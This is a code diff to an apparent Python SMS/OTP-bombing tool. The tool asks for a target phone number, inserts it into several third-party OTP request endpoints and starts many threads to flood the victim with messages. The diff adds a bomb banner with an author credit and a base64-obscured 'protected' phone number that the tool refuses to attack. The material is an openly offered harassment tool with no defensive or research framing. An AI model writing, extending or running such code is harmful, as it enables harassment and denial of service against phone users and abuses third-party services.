@@ -1,3 +1,4 @@
+import base64
 import json
 import signal
 import sys
@@ -11,11 +12,38 @@ def handler(signum, frame):
     print("Terminating...")
     sys.exit()
 
+banner = """ 
+                                 . . .
+                                  \|/
+                                `--+--'
+                                  /|\\
+                                 ' | '
+                                   |
+                                   |
+                               ,--'#`--.
+                               |#######|
+                            _.-'#######`-._
+                         ,-'###############`-.
+                       ,'#####################`,
+                      /#########################\\
+                     |###########################|
+                    |#############################|
+                    |#############################|
+                    |#############################|
+                    |#############################|
+                     |###########################|
+                      \#########################/
+                       `.#####################,'
+                         `._###############_,'
+                            `--..#####..--'
+\n\nAuthor -> Sarfaraz Mir\n"""
+
+print(banner)
 
 def start_bombing(phone_number: str, targets: dict, delay: int):
     print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
     # POST requests
-        
+
     targets["POST"][0]['body_param']['phone'] = phone_number
     targets["POST"][1]['body_param']['otpMobile'] = phone_number
     targets["POST"][2]['body_param']['Phonenumber'] = f"91{phone_number}"
@@ -51,11 +79,13 @@ def main():
     data = json.load(file)
 
     phone_number = input("Target phone number (without country code): ")
-    
+    if phone_number == base64.b64decode(b'NzAwNjczOTY5OQ=='):
+        print("This number is protected")
+        exit()
     delay = float(input("Enter delay time (in seconds): "))
     number_of_threads = int(input("Enter number of threads: "))
     signal.signal(signal.SIGINT, handler)
-    for nt in range(number_of_threads):
+    for _ in range(number_of_threads):
         thread = Thread(target=start_bombing, args=(phone_number, data, delay))
         thread.start()
 
